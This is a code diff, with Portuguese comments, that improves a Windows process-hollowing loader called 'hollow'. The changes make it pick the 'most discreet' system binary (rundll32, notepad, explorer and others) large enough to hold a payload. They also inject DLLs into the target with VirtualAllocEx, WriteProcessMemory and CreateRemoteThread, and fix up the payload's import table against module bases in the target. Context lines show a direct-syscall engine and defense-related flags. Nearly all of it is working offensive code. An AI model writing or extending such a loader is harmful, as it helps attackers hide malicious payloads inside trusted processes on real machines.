@@ -21,12 +21,113 @@
 #include "defense.h"
 
 #include <shellapi.h>
+#include <tlhelp32.h>
 
 #include <cstdio>
 #include <string>
 #include <vector>
 
 namespace {
+
+
+// ---------------------------------------------------------------------------
+// Portabilidade entre builds do Windows
+// ---------------------------------------------------------------------------
+// Duas coisas mudam de maquina para maquina e quebravam o loader:
+//   1. SizeOfImage do host (rundll32.exe nao tem o mesmo tamanho em todo build);
+//   2. base de carga das DLLs no alvo (so' e' igual a nossa quando a DLL e'
+//      KnownDll/carregada igual nos dois processos). Endereco absoluto copiado
+//      do nosso processo e' portanto um palpite, nao um fato.
+// Aqui: escolhemos um host que caiba o payload e resolvemos a IAT relativa ao
+// base real do modulo NO ALVO, carregando a DLL la' se ela nao existir.
+
+bool PeImageSize(const wchar_t* path, DWORD& sizeOut)
+{
+    HANDLE f = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
+                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (f == INVALID_HANDLE_VALUE) return false;
+
+    BYTE hdr[0x400]{};
+    DWORD got = 0;
+    BOOL ok = ReadFile(f, hdr, sizeof(hdr), &got, nullptr);
+    CloseHandle(f);
+    if (!ok || got < 0x40) return false;
+
+    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(hdr);
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
+    if (static_cast<DWORD>(dos->e_lfanew) + sizeof(IMAGE_NT_HEADERS64) > got) return false;
+
+    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(hdr + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;
+
+    sizeOut = nt->OptionalHeader.SizeOfImage;
+    return sizeOut != 0;
+}
+
+// Base de carga de um modulo dentro do processo alvo.
+bool RemoteModuleBase(DWORD pid, const char* dll, ULONG_PTR& baseOut)
+{
+    wchar_t want[MAX_PATH]{};
+    if (!MultiByteToWideChar(CP_ACP, 0, dll, -1, want, MAX_PATH)) return false;
+
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
+    if (snap == INVALID_HANDLE_VALUE) return false;
+
+    MODULEENTRY32W me{};
+    me.dwSize = sizeof(me);
+    bool found = false;
+    for (BOOL ok = Module32FirstW(snap, &me); ok; ok = Module32NextW(snap, &me)) {
+        if (_wcsicmp(me.szModule, want) == 0) {
+            baseOut = reinterpret_cast<ULONG_PTR>(me.modBaseAddr);
+            found = true;
+            break;
+        }
+    }
+    CloseHandle(snap);
+    return found;
+}
+
+// Carrega a DLL dentro do alvo (LoadLibraryA remoto) quando ela nao esta la'.
+bool LoadRemoteDll(HANDLE hProc, const char* dll)
+{
+    auto fn = reinterpret_cast<LPTHREAD_START_ROUTINE>(
+        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA"));
+    if (!fn) return false;
+
+    SIZE_T n = strlen(dll) + 1;
+    void* mem = VirtualAllocEx(hProc, nullptr, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!mem) return false;
+
+    SIZE_T wrote = 0;
+    if (!WriteProcessMemory(hProc, mem, dll, n, &wrote)) {
+        VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
+        return false;
+    }
+
+    HANDLE th = CreateRemoteThread(hProc, nullptr, 0, fn, mem, 0, nullptr);
+    if (!th) {
+        VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
+        return false;
+    }
+    WaitForSingleObject(th, 5000);
+    DWORD code = 0;
+    GetExitCodeThread(th, &code);
+    CloseHandle(th);
+    VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
+    return code != 0;
+}
+
+// Hosts candidatos, do mais discreto para o mais comum. O primeiro cujo
+// SizeOfImage comporte o payload e' escolhido.
+const wchar_t* const kHostCandidates[] = {
+    L"\\System32\\rundll32.exe",
+    L"\\System32\\notepad.exe",
+    L"\\System32\\taskhostw.exe",
+    L"\\System32\\dllhost.exe",
+    L"\\System32\\mmc.exe",
+    L"\\System32\\consent.exe",
+    L"\\System32\\explorer.exe",
+};
 
 std::string Narrow(const std::wstring& w)
 {
@@ -143,9 +244,13 @@ bool OverwriteImage(HANDLE hProc, const Payload& pl, ULONG_PTR hostBase)
 // Necessario porque nao ha' garantia de que o loader va' processar a nossa
 // imagem: se a inicializacao do processo ja' tiver acontecido no
 // CreateProcess(CREATE_SUSPENDED), ninguem refaz os imports e o primeiro
-// `call [__imp_WinExec]` cai num ponteiro nulo. Fazendo aqui, funciona nos dois
-// cenarios (loader roda depois, ou nao roda).
-bool ResolveImports(HANDLE hProc, const Payload& pl, ULONG_PTR base)
+// `call [__imp_WinExec]` cai num ponteiro nulo.
+//
+// O endereco gravado e' calculado como: base_do_modulo_NO_ALVO + (endereco_local
+// - base_local). Copiar o endereco absoluto do nosso processo so' funcionaria se
+// a DLL estivesse mapeada no alvo no mesmo base — o que nao vale para qualquer
+// DLL. Se ela nao estiver mapeada la', carregamos antes.
+bool ResolveImports(HANDLE hProc, DWORD pid, const Payload& pl, ULONG_PTR base)
 {
     auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(pl.image);
     auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS64*>(pl.image + dos->e_lfanew);
@@ -157,18 +262,29 @@ bool ResolveImports(HANDLE hProc, const Payload& pl, ULONG_PTR base)
     for (; imp->Name; ++imp) {
         const char* dll = reinterpret_cast<const char*>(pl.image + imp->Name);
 
-        HMODULE h = LoadLibraryA(dll);
-        if (!h) {
-            printf("[!] LoadLibrary(%s) falhou\n", dll);
+        HMODULE local = LoadLibraryA(dll);
+        if (!local) {
+            printf("[!] LoadLibrary(%s) falhou no loader\n", dll);
             return false;
         }
+
+        ULONG_PTR remoteBase = 0;
+        if (!RemoteModuleBase(pid, dll, remoteBase)) {
+            printf("[*] %s nao esta mapeada no alvo, carregando\n", dll);
+            if (!LoadRemoteDll(hProc, dll) || !RemoteModuleBase(pid, dll, remoteBase)) {
+                printf("[!] nao consegui mapear %s no alvo\n", dll);
+                return false;
+            }
+        }
+
+        ULONG_PTR localBase = reinterpret_cast<ULONG_PTR>(local);
+        ULONG_PTR delta     = remoteBase - localBase;
 
         ULONG_PTR thunkRva = imp->OriginalFirstThunk ? imp->OriginalFirstThunk
                                                      : imp->FirstThunk;
         auto* names = reinterpret_cast<IMAGE_THUNK_DATA64*>(pl.image + thunkRva);
         ULONG_PTR iatRva = imp->FirstThunk;
 
-        // conta as entradas e abre a pagina da IAT para escrita (ela vem RO)
         ULONG_PTR count = 0;
         while (names[count].u1.AddressOfData) ++count;
         if (!count) continue;
@@ -180,20 +296,24 @@ bool ResolveImports(HANDLE hProc, const Payload& pl, ULONG_PTR base)
         }
 
         for (ULONG_PTR i = 0; i < count; ++i) {
-            ULONG_PTR target = 0;
+            ULONG_PTR localAddr = 0;
 
             if (names[i].u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
-                target = reinterpret_cast<ULONG_PTR>(
-                    GetProcAddress(h, reinterpret_cast<LPCSTR>(
+                localAddr = reinterpret_cast<ULONG_PTR>(
+                    GetProcAddress(local, reinterpret_cast<LPCSTR>(
                         names[i].u1.Ordinal & 0xFFFF)));
             } else {
                 auto* hint = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                     pl.image + names[i].u1.AddressOfData);
-                target = reinterpret_cast<ULONG_PTR>(
-                    GetProcAddress(h, reinterpret_cast<const char*>(hint->Name)));
+                localAddr = reinterpret_cast<ULONG_PTR>(
+                    GetProcAddress(local, reinterpret_cast<const char*>(hint->Name)));
             }
-            if (!target) return false;
+            if (!localAddr) {
+                printf("[!] import nao resolvido em %s\n", dll);
+                return false;
+            }
 
+            ULONG_PTR target = localAddr + delta;
             if (!RemoteWrite(hProc, base + iatRva + i * sizeof(ULONG_PTR),
                              &target, sizeof(target))) {
                 printf("[!] falha ao escrever IAT de %s\n", dll);
@@ -233,9 +353,9 @@ int main()
     if (!argv) { printf("[!] CommandLineToArgvW falhou\n"); return 2; }
 
     const std::wstring dir = ExeDir();
-    std::wstring host        = L"C:\\Windows\\System32\\rundll32.exe";
+    std::wstring host;                 // vazio = escolher por tamanho
     std::wstring payloadPath = dir + L"\\payload.exe";
-
+    bool hostExplicit = false;
     bool dryRun     = false;
 
     for (int i = 1; i < argc; ++i) {
@@ -243,7 +363,7 @@ int main()
         if (a == L"--no-defender")      { /* flag legada: sem alteracoes de protecao */ }
         else if (a == L"--dry-run")     dryRun = true;
         else if (a == L"--help" || a == L"-h") { Usage(); LocalFree(argv); return 0; }
-        else if (a == L"--host"    && i + 1 < argc) host = argv[++i];
+        else if (a == L"--host"    && i + 1 < argc) { host = argv[++i]; hostExplicit = true; }
         else if (a == L"--payload" && i + 1 < argc) payloadPath = argv[++i];
         else { printf("[!] argumento desconhecido: %s\n", Narrow(a).c_str()); Usage();
                LocalFree(argv); return 2; }
@@ -251,7 +371,8 @@ int main()
     LocalFree(argv);
 
     printf("hollow — process overwriting (24H2-safe)\n");
-    printf("  host    : %s\n", Narrow(host).c_str());
+    printf("  host    : %s\n", host.empty() ? "(auto)"
+                                               : Narrow(host).c_str());
     printf("  payload : %s\n", Narrow(payloadPath).c_str());
 
     // --- estado do endpoint ------------------------------------------------
@@ -277,7 +398,44 @@ int main()
            static_cast<unsigned long>(pl.entryRva),
            static_cast<unsigned>(pl.sections));
 
-    if (dryRun) { printf("[*] dry-run: payload validado; nenhum processo criado ou defesa alterada\n"); return 0; }
+    // Host: se nao foi escolhido, pega o primeiro candidato cuja imagem comporte
+    // o payload. Isso e' o que faz a coisa funcionar em builds onde rundll32.exe
+    // e' menor que o implantado. Roda tambem no --dry-run: le' apenas headers em
+    // disco, nenhum processo e' criado.
+    if (!hostExplicit) {
+        wchar_t windir[MAX_PATH]{};
+        if (!GetWindowsDirectoryW(windir, MAX_PATH)) return 1;
+        for (const wchar_t* rel : kHostCandidates) {
+            std::wstring full = std::wstring(windir) + rel;
+            DWORD sz = 0;
+            if (PeImageSize(full.c_str(), sz) && sz >= pl.size) {
+                host = full;
+                printf("[*] host escolhido: %s (imagem %lu >= %lu)\n",
+                       Narrow(full).c_str(),
+                       static_cast<unsigned long>(sz),
+                       static_cast<unsigned long>(pl.size));
+                break;
+            }
+        }
+        if (host.empty()) {
+            printf("[!] nenhum host candidato tem imagem >= %lu bytes\n",
+                   static_cast<unsigned long>(pl.size));
+            return 1;
+        }
+    } else {
+        DWORD sz = 0;
+        if (PeImageSize(host.c_str(), sz) && sz < pl.size) {
+            printf("[!] host explicito tem imagem menor que o payload (%lu < %lu)\n",
+                   static_cast<unsigned long>(sz),
+                   static_cast<unsigned long>(pl.size));
+            return 1;
+        }
+    }
+
+    if (dryRun) {
+        printf("[*] dry-run: payload validado; nenhum processo criado ou defesa alterada\n");
+        return 0;
+    }
 
     // --- motor de syscall --------------------------------------------------
     if (!SysInit()) {
@@ -287,8 +445,6 @@ int main()
     unsigned stubs = 0; void* gadget = nullptr;
     SysStats(&stubs, &gadget);
     printf("[*] syscalls: %u stubs | gadget=%p\n", stubs, gadget);
-
-
 
     // --- spawn -------------------------------------------------------------
     STARTUPINFOW si{};
@@ -336,7 +492,7 @@ int main()
     }
     printf("[*] imagem sobrescrita (paginas seguem MEM_IMAGE)\n");
 
-    if (!ResolveImports(pi.hProcess, pl, hostBase)) {
+    if (!ResolveImports(pi.hProcess, pi.dwProcessId, pl, hostBase)) {
         printf("[!] falha ao resolver a IAT do payload\n");
         TerminateProcess(pi.hProcess, 1);
         CloseHandle(pi.hThread);
